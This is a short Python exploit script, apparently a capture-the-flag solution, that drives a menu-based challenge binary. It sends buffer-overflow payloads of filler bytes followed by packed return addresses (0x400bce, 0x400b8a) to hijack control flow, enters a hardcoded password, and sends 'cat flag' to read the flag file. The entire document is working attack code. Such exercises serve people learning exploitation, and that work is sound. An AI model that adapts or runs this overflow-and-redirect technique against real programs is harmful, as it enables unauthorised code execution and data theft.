import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()
data = p.readuntil('choice:')
p.sendline(b'1')
p.sendline(b'A'*128 + b'B' * 16 + b'C' * 4+ p64(0x400bce))
p.sendline('\n')
p.sendline(b'3')
p.sendline('\n')
p.sendline(b'2')
p.sendline(b'l0ln0onewillguessth1s')
p.sendline('\n')
p.sendline(b'0')
p.sendline(b'1')
p.sendline(b'cat flag\x00')
p.sendline(b'1')
p.sendline(b'D'*128 + b'E' * 16 + b'F' * 4 + p64(0x400b8a))
p.sendline('\n')
p.sendline(b'4')
p.sendline('\n')
p.sendline(b'2')
p.interactive()